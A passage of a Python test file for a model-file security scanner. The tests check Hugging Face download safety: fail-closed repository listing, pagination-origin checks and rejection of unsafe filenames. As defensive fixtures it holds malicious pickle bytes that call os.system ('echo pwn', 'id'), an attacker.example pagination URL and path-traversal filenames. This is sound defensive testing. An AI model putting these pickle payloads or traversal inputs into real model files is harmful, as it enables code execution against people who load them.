        payload = b"cos\nsystem\n(S'echo pwn'\ntR." if scanner_id == "pickle" else gzip.compress(b"payload")
        mock_snapshot_download.side_effect = snapshot_side_effect
        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=([filename], _HF_TEST_REVISION, None),
            ),
            patch("requests.get", return_value=_FakeRangeResponse(payload)) as mock_requests_get,
            patch(
                "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes", return_value=({}, _HF_TEST_REVISION)
            ),
            patch("huggingface_hub.snapshot_download", mock_snapshot_download),
        ):
            result = download_model(
                "https://huggingface.co/test/model",
                cache_dir=tmp_path / "cache",
                scannable_extensions=extensions,
                scannable_scanner_ids={scanner_id},
            )

        assert result == download_path
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == [filename]
        mock_requests_get.assert_called_once()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_success(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful model download."""
        # Mock the snapshot_download to return a path
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download
        result = download_model("https://huggingface.co/test/model")

        # Verify the download was called correctly
        mock_snapshot_download.assert_called_once()
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["repo_id"] == "test/model"
        assert result == mock_path

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fills_repository_file_inventory(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "pytorch_model.bin").write_bytes(b"weights")
        (mock_path / "model.safetensors").write_bytes(b"safe weights")
        mock_snapshot_download.return_value = str(mock_path)
        inventory: list[str] = []

        result = download_model("https://huggingface.co/test/model", repository_file_inventory=inventory)

        assert result == mock_path
        assert inventory == ["pytorch_model.bin", "model.safetensors"]

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_cache_dir(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test model download with custom cache directory."""
        mock_path = tmp_path / "test" / "model"
        mock_path.mkdir(parents=True)
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        cache_dir = tmp_path / "custom_cache"
        download_model("hf://test/model", cache_dir=cache_dir)

        # Verify cache directory was used (we now use local_dir instead of cache_dir for safety)
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["local_dir"] == str(cache_dir / "huggingface" / "test" / "model")

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_revalidates_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Existing local cache directories should still delegate freshness checks to the HF SDK."""
        cache_dir = tmp_path / "custom_cache"
        existing_path = cache_dir / "huggingface" / "test" / "model"
        existing_path.mkdir(parents=True)
        (existing_path / "config.json").write_text("{}", encoding="utf-8")
        (existing_path / "model.bin").write_bytes(b"stale bytes")
        mock_snapshot_download.return_value = str(existing_path)

        result = download_model("hf://test/model", cache_dir=cache_dir)

        assert result == existing_path
        mock_snapshot_download.assert_called_once()
        assert mock_snapshot_download.call_args.kwargs["local_dir"] == str(existing_path)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repo listing failed"),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_error_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Listing failures must not silently skip renamed content-routed payloads."""
        with pytest.raises(Exception, match=r"selective filtering incomplete.*repo listing failed"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_timeout_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
    ) -> None:
        """Listing timeouts must not silently skip renamed content-routed payloads."""

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(None, None, "timed out after 30 seconds"),
            ),
            pytest.raises(Exception, match=r"selective filtering incomplete.*timed out after 30 seconds"),
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_timeout_uses_hfapi_timeout(
        self,
        mock_repo_info: MagicMock,
        mock_paginated_listing: MagicMock,
    ) -> None:
        """Timeout helper should use the request-layer timeout instead of background threads."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="config.json")],
        )
        mock_paginated_listing.return_value = ["config.json"]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_repo_info.assert_called_once_with("test/model", timeout=7, files_metadata=False)
        mock_paginated_listing.assert_called_once_with("test/model", _HF_TEST_REVISION, timeout_seconds=7)

    @patch("modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_timeout_passes_requested_revision(
        self,
        mock_repo_info: MagicMock,
        mock_paginated_listing: MagicMock,
    ) -> None:
        """Requested repository revisions should reach direct HfApi listing calls."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="config.json")],
        )
        mock_paginated_listing.return_value = ["config.json"]

        repo_files, revision, error = _list_repo_files_with_timeout(
            "test/model",
            timeout_seconds=7,
            revision="refs/pr/1",
        )

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_repo_info.assert_called_once_with(
            "test/model",
            timeout=7,
            files_metadata=False,
            revision="refs/pr/1",
        )
        mock_paginated_listing.assert_called_once_with("test/model", _HF_TEST_REVISION, timeout_seconds=7)

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_worker_with_deadline")
    def test_list_repo_files_deadline_uses_terminable_worker(self, mock_run_worker: MagicMock) -> None:
        """Deadline-bound listings must be terminable, not only socket-timeout bounded."""
        mock_run_worker.return_value = {
            "value": {"files": ["config.json"], "revision": _HF_TEST_REVISION},
        }

        repo_files, revision, error = _list_repo_files_with_timeout(
            "test/model",
            timeout_seconds=7,
            deadline=123.0,
        )

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_run_worker.assert_called_once_with(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7},
            123.0,
            "test/model",
        )

    @patch("modelaudit.utils.sources.huggingface._list_huggingface_repo_files_at_revision")
    def test_download_worker_serializes_repository_listing(self, mock_list_at_revision: MagicMock) -> None:
        """The deadline worker should return only serializable listing evidence."""
        mock_list_at_revision.return_value = (["config.json", "model.bin"], _HF_TEST_REVISION)

        result = _run_huggingface_worker_operation(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7},
        )

        assert result == {
            "value": {"files": ["config.json", "model.bin"], "revision": _HF_TEST_REVISION},
        }
        mock_list_at_revision.assert_called_once_with(
            "test/model",
            requested_revision=None,
            timeout_seconds=7,
        )

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_worker_with_deadline")
    def test_list_repo_files_deadline_passes_requested_revision(self, mock_run_worker: MagicMock) -> None:
        """Requested revisions must also reach the terminable listing worker."""
        mock_run_worker.return_value = {
            "value": {"files": ["config.json"], "revision": _HF_TEST_REVISION},
        }

        repo_files, revision, error = _list_repo_files_with_timeout(
            "test/model",
            timeout_seconds=7,
            deadline=123.0,
            revision="refs/pr/1",
        )

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_run_worker.assert_called_once_with(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7, "revision": "refs/pr/1"},
            123.0,
            "test/model",
        )

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_uses_paginated_tree_inventory(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
    ) -> None:
        """Large repository inventory should consume every tree page once and deduplicate names."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_session = mock_get_session.return_value
        mock_session.stream.side_effect = [
            _FakeTreeResponse(
                [
                    {"type": "file", "path": "z-model.bin"},
                    {"type": "directory", "path": "nested"},
                ],
                links={"next": {"url": "https://huggingface.co/api/models/test/model/tree/page-2"}},
            ),
            _FakeTreeResponse(
                [
                    {"type": "file", "path": "a-config.json"},
                    {"type": "file", "path": "z-model.bin"},
                ],
            ),
        ]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files == ["a-config.json", "z-model.bin"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_get_session.assert_called_once_with()
        assert mock_session.stream.call_count == 2
        assert mock_session.stream.call_args_list[0].args[:2] == ("GET", ANY)
        assert mock_session.stream.call_args_list[0].kwargs["params"] == {"recursive": True, "expand": False}
        assert mock_session.stream.call_args_list[1].args[:2] == (
            "GET",
            "https://huggingface.co/api/models/test/model/tree/page-2",
        )
        assert mock_session.stream.call_args_list[1].kwargs["params"] is None

    @pytest.mark.parametrize(
        ("next_url", "expected_error"),
        [
            ("https://attacker.example/api/models/test/model/tree/page-2", "pagination link changed origin"),
            ("http://huggingface.co/api/models/test/model/tree/page-2", "pagination link changed origin"),
            ("https://user:pass@huggingface.co/api/models/test/model/tree/page-2", "invalid pagination link"),
            ("https://huggingface.co:bad/api/models/test/model/tree/page-2", "invalid pagination link"),
            ("/api/models/test/model/tree/page-2", "invalid pagination link"),
        ],
    )
    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_unsafe_pagination_links_before_following(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        next_url: str,
        expected_error: str,
    ) -> None:
        """Unsafe next links must fail closed before auth headers can reach another origin."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_session = mock_get_session.return_value
        mock_session.stream.side_effect = [
            _FakeTreeResponse(
                [{"type": "file", "path": "first.bin"}],
                links={"next": {"url": next_url}},
            ),
            AssertionError("unsafe pagination link should not be followed"),
        ]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert expected_error in error
        assert mock_session.stream.call_count == 1
        requested_urls = [stream_call.args[1] for stream_call in mock_session.stream.call_args_list]
        assert next_url not in requested_urls

    @pytest.mark.parametrize(
        "filename",
        [
            "../escape.bin",
            "/abs.bin",
            "nested/../../escape.bin",
            "nested//model.bin",
            r"nested\escape.bin",
            "bad\x00name.bin",
        ],
    )
    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_unsafe_paginated_names(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        filename: str,
    ) -> None:
        """Repository tree names must not escape local placement or verification roots."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse([{"type": "file", "path": filename}])

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "unsafe repository filename" in error

    @pytest.mark.parametrize(
        "tree_item",
        [
            {"path": "malicious.pkl"},
            {"type": None, "path": "malicious.pkl"},
            {"type": "lfs", "path": "malicious.pkl"},
        ],
    )
    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_unknown_paginated_tree_item_types(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        tree_item: dict[str, object],
    ) -> None:
        """Unknown tree item types must not create a partial benign inventory."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [
                {"type": "file", "path": "benign.bin"},
                tree_item,
            ]
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "unknown tree item type" in error

    @pytest.mark.parametrize(
        "tree_item",
        [
            {"type": "file"},
            {"type": "file", "path": None},
            {"type": "file", "path": 123},
        ],
    )
    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_malformed_paginated_file_entries(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        tree_item: dict[str, object],
    ) -> None:
        """Malformed file entries must fail closed before the inventory is accepted."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [
                {"type": "file", "path": "benign.bin"},
                tree_item,
            ]
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "invalid repository filename" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_repeated_pagination_cursor(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
    ) -> None:
        """A repeated next page URL must fail closed instead of looping or double-counting."""
        repeated_url = "https://huggingface.co/api/models/test/model/tree/repeated"
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_session = mock_get_session.return_value
        mock_session.stream.side_effect = [
            _FakeTreeResponse([{"type": "file", "path": "first.bin"}], links={"next": {"url": repeated_url}}),
            _FakeTreeResponse([{"type": "file", "path": "second.bin"}], links={"next": {"url": repeated_url}}),
        ]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "pagination cursor repeated" in error
        assert mock_session.stream.call_count == 2

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_truncated_paginated_inventory(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
    ) -> None:
        """A later page failure must not produce a partial successful inventory."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.side_effect = [
            _FakeTreeResponse(
                [{"type": "file", "path": "first.bin"}],
                links={"next": {"url": "https://huggingface.co/api/models/test/model/tree/page-2"}},
            ),
            RuntimeError("page 2 failed"),
        ]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "page 2 failed" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_excessive_paginated_inventory(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Repository inventory remains explicitly bounded even when pagination succeeds."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface._MAX_HF_REPOSITORY_INVENTORY_FILES", 2)
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [
                {"type": "file", "path": "one.bin"},
                {"type": "file", "path": "two.bin"},
                {"type": "file", "path": "three.bin"},
            ]
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "bounded inventory limit" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_excessive_tree_page_response_bytes(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Tree pages must be byte-bounded before JSON decoding."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface._MAX_HF_REPOSITORY_TREE_PAGE_RESPONSE_BYTES", 16)
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [{"type": "file", "path": "model.bin"}],
            headers={"Content-Length": "17"},
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "bounded response limit" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_overlong_paginated_names(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Accepted tree paths must be length-bounded before local path or glob use."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface._MAX_HF_REPOSITORY_PATH_CHARS", 8)
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [{"type": "file", "path": "very-long-model.bin"}]
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "bounded path length" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_excessive_page_count(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Pagination must fail closed when page count exceeds the explicit cap."""
        monkeypatch.setattr("modelaudit.utils.sources.huggingface._MAX_HF_REPOSITORY_INVENTORY_PAGES", 1)
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_get_session.return_value.stream.return_value = _FakeTreeResponse(
            [{"type": "file", "path": "first.bin"}],
            links={"next": {"url": "https://huggingface.co/api/models/test/model/tree/page-2"}},
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "bounded pagination limit" in error

    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_canonicalizes_repeated_pagination_cursor(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
    ) -> None:
        """Semantically repeated next URLs must not evade loop detection by query ordering."""
        first_url = "https://huggingface.co/api/models/test/model/tree/page?cursor=abc&expand=false"
        repeated_url = "https://huggingface.co/api/models/test/model/tree/page?expand=false&cursor=abc"
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_session = mock_get_session.return_value
        mock_session.stream.side_effect = [
            _FakeTreeResponse([{"type": "file", "path": "first.bin"}], links={"next": {"url": first_url}}),
            _FakeTreeResponse([{"type": "file", "path": "second.bin"}], links={"next": {"url": repeated_url}}),
        ]

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files is None
        assert revision is None
        assert error is not None
        assert "pagination cursor repeated" in error
        assert mock_session.stream.call_count == 2

    @patch("huggingface_hub.utils.build_hf_headers")
    @patch("huggingface_hub.utils.get_session")
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_uses_configured_session_and_auth_headers(
        self,
        mock_repo_info: MagicMock,
        mock_get_session: MagicMock,
        mock_build_headers: MagicMock,
    ) -> None:
        """Private or gated inventories should use Hub-configured auth headers and transport."""
        mock_repo_info.return_value = SimpleNamespace(sha=_HF_TEST_REVISION)
        mock_build_headers.return_value = {"authorization": "Bearer configured-token"}
        mock_session = mock_get_session.return_value
        mock_session.stream.return_value = _FakeTreeResponse([{"type": "file", "path": "model.bin"}])

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files == ["model.bin"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_build_headers.assert_called_once_with(token=None)
        mock_get_session.assert_called_once_with()
        assert mock_session.stream.call_args.args[0] == "GET"
        assert mock_session.stream.call_args.kwargs["headers"] == {"authorization": "Bearer configured-token"}

    @patch("modelaudit.utils.sources.huggingface._list_huggingface_repo_files_at_revision")
    def test_download_worker_passes_requested_revision_to_listing(self, mock_list_at_revision: MagicMock) -> None:
        """Worker listing operations should not silently fall back to default branch."""
        mock_list_at_revision.return_value = (["model.bin"], _HF_TEST_REVISION)

        result = _run_huggingface_worker_operation(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7, "revision": "refs/pr/1"},
        )

        assert result == {
            "value": {"files": ["model.bin"], "revision": _HF_TEST_REVISION},
        }
        mock_list_at_revision.assert_called_once_with(
            "test/model",
            requested_revision="refs/pr/1",
            timeout_seconds=7,
        )

    @patch("huggingface_hub.HfApi.model_info")
    def test_download_worker_passes_requested_revision_to_model_size(self, mock_model_info: MagicMock) -> None:
        """Worker model-size operations should query the requested revision."""
        mock_model_info.return_value = SimpleNamespace(
            siblings=[SimpleNamespace(size=7), SimpleNamespace(size=None)],
        )

        result = _run_huggingface_worker_operation(
            "get_model_size",
            {"repo_id": "test/model", "request_timeout": 7, "revision": "refs/pr/1"},
        )

        assert result == {"value": 7}
        mock_model_info.assert_called_once_with("test/model", timeout=7, revision="refs/pr/1")

    @pytest.mark.parametrize("revision", [None, "", "main", "g" * 40])
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_non_commit_revision(
        self,
        mock_repo_info: MagicMock,
        revision: str | None,
    ) -> None:
        """Selective filtering must not trust a mutable or malformed repository revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=revision,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )

        repo_files, pinned_revision, error = _list_repo_files_with_timeout("test/model")

        assert repo_files is None
        assert pinned_revision is None
        assert error == "repository listing did not include an immutable commit SHA"

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_without_immutable_revision(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Snapshot filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["weights[latest].bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_escapes_selected_filenames_as_exact_allow_patterns(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Untrusted repository filenames must not change snapshot glob selection."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "weights[latest].bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["weights[[]latest].bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_content_routed_skipped_file(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selective snapshot downloads should include renamed content-routed model files."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "evil.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(valid_png_bytes())

        mock_requests_get.side_effect = get_side_effect

        download_model("https://huggingface.co/test/model")

        allow_patterns = mock_snapshot_download.call_args.kwargs["allow_patterns"]
        assert allow_patterns == ["pytorch_model.bin", "evil.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)
        assert all(call.kwargs["headers"]["Accept-Encoding"] == "identity" for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_accepts_content_routed_only_snapshot(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Post-download verification should recognize selected renamed model payloads."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "hidden.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)

        assert download_model("https://huggingface.co/test/model") == download_path
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == "tflite"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_snapshot_omits_selected_file(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Snapshot downloads must contain every file selected during immutable preflight."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        mock_snapshot_download.return_value = str(download_path)

        with pytest.raises(Exception, match=r"snapshot missing 1 selected file\(s\) for test/model"):
            download_model("https://huggingface.co/test/model")

    @pytest.mark.parametrize(
        "payload, expected_format",
        [
            (
                struct.pack("<Q", len(b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'))
                + b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
                + b"\x00\x00\x00\x00",
                "safetensors",
            ),
            (pickle.dumps({"weights": [1, 2, 3]}, protocol=0), "pickle"),
            (
                (b"\x8c\x01x0" * 8) + b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.",
                "pickle",
            ),
            (
                (b"\x8c\x01x0" * ((8 * 1024) // 4))
                + b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.",
                "pickle",
            ),
            (_make_tar_payload(), "tar"),
            (b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk"),
            (
                b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n",
                "lightgbm",
            ),
            (b'<?xml version="1.0" encoding="UTF-8"?><PMML version="4.4"></PMML>', "pmml"),
            (b'{"orbax_version":"1.0","framework":"jax"}', "jax_checkpoint"),
            (
                b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
                "mxnet",
            ),
            (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00", "executorch"),
            (b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03", "flax_msgpack"),
            (
                b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                "flax_msgpack",
            ),
            (
                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
